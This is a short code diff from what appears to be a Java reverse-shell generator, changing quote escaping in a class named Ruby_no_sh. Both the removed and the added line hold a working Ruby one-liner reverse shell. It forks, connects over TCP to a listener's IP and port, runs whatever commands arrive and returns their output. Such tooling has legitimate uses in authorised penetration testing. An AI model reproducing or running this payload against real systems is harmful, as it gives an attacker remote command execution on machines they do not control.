@@ -8,7 +8,7 @@
 
         public Ruby_no_sh(String localIP, int localPort, LISTENER listener, SHELLS shellType){
             super(localIP, localPort, listener, shellType);
-            shellFormat = String.format("ruby -rsocket -e'exit if fork;c=TCPSocket.new(\\\"%s\\\",\\\"%s\\\");loop{c.gets.chomp!;(exit! if $_==\\\"exit\\\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \\\"failed: #{$_}\\\"}'",this.getLocalIP() ,this.getLocalPort());
+            shellFormat = String.format("ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"%s\",\"%s\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'",this.getLocalIP() ,this.getLocalPort());
         }
 
         @Override
